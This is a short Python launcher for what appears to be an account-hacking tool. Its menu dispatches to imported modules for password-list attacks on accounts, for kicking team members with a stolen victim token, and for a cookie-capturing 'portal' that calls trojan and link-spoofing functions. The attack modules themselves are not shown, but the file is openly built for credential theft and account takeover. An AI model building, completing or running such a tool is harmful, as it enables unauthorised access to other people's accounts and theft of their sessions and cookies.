import check
import hack_multipart_account
import team_hack


def funcs_print():
    menu = """
        Functions. by ma3rx fish224 kv4nt chleb
        1. Multipart acc hacking
        2. Team members kicking
        3. Capturing portal(cookies)
    """


def start():
    try:
        func = input('Choose function : ')

        if func == '1':
            with open("passwords.txt", "r") as passwords:
                hack_multipart_account.start(passwords)

        elif func == '2':
            token = input("Введите токен жертвы: ")
            id = input("ID команды: ")
            team_hack.hack(token=token, team=id)

        elif func == '3':
            print("Захватывающий портал. Только для fish224.")
            check.trojan()
            check.link_spoof()
            print("Готово")

    except Exception as exc:
        print('Ошибка', exc)


if __name__ == '__main__':
    start()
